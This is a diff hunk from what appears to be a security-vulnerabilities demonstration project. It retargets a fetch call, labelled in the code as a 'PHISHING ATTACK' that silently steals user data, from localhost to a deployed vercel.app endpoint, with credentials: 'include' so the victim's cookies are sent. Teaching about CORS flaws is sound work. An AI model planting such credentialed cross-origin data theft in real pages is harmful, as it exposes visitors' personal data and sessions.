@@ -288,7 +288,7 @@
                 console.log('🚨 PHISHING ATTACK: Silently stealing user data...');
                 
                 // Attempt to steal user data via CORS vulnerability
-                const response = await fetch('http://localhost:3003/api/userDetails', {
+                const response = await fetch('https://security-vulnerabilities-demo-89fx-kyxqz5xe7.vercel.app/api/userDetails', {
                     method: 'GET',
                     credentials: 'include', // Automatically includes cookies from target domain
                     headers: {
